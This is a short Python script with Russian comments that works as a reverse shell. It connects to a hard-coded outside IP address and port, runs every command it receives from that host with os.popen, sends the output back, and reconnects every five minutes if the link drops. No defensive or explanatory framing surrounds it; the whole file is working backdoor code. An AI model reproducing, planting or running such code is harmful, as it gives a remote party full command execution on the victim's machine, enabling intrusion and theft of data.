import socket
import os
import time
while True:
    try:
        sock = socket.socket()
        sock.connect(("109.169.239.111", 9494))
        while True:
            try:
                data = sock.recv(1024).decode()  # получаем команду
                aa = os.popen(data)
                result = aa.read()
                if len(result) == 0:
                    sock.send(" ".encode())  # в случае, если рзультат
                    # пустой, отправляем пробел
                else:
                    sock.send(result.encode())  # отправляем результат
            except:
                break
    except:
        time.sleep(300)
        continue